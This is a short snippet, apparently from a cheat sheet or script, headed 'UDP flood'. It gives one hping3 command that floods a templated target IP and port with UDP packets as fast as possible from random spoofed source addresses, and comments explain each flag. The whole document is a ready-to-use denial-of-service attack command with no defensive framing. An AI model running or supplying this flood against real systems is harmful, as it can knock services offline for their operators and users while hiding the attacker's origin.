# UDP flood
#   –flood: sent packets as fast as possible
#   –rand-source: random source address
#   –udp: UDP mode
#   -p –destport: destination port (default 0)

hping3 --flood --rand-source --udp -p ${TARGET_PORT} ${TARGET_IP}
